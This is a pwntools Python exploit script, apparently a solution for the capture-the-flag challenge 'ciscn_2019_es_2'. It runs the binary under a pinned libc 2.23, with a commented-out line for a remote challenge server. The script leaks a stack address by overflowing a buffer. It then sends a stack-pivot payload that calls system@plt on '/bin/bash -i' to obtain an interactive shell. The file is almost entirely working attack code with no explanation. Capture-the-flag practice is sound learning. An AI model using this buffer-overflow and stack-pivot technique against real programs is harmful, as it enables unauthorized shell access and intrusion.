from pwn import *

context.arch = 'i386'
system_plt = 0x8048400
r = process(["../../libc/ld-2.23_86.so", "./ciscn_2019_es_2"],
            env={"LD_PRELOAD": "../../libc/libc-2.23_86.so"})
# r = remote("node3.buuoj.cn", 27918)
r.recvline()
r.sendline('a' * 0x27)
r.recvline()
stack = u32(r.recv(4)) - 0x38
r.recvline()
r.sendline(flat([stack + 0x28, system_plt, 1, stack + 0x10]) + '/bin/bash -i' + flat([0, 1, 1, stack, 0x80485fd]))
r.recvline()
r.interactive()
